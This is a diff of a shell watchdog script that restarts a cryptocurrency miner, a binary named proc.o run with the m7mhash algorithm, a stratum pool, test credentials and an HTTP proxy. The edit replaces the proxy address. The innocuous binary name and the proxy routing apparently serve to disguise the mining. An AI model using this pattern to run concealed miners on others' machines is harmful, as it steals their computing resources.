@@ -16,7 +16,7 @@ RESULT=`pgrep ${PROCESS}`
 if [ "${RESULT:-null}" = null ]; then
     echo "${PROCESS} not running, starting "$PROCANDARGS
     #~/HappyPony/proc.o -a m7mhash --proxy=http://92.52.160.50:8080  -o stratum+tcp://magi.trasmamod.com:3333 --user=mindamp.test --pass=test -e 50 &
-    ~/HappyPony/proc.o -a m7mhash --proxy=http://92.52.160.50:8080 -o stratum+tcp://xmg.minerclaim.net:3333 --user=mindamp.test --pass=test -e 10 &
+    ~/HappyPony/proc.o -a m7mhash --proxy=http://54.36.65.225:3128 -o stratum+tcp://xmg.minerclaim.net:3333 --user=mindamp.test --pass=test -e 10 &
 
 else
     echo "running"
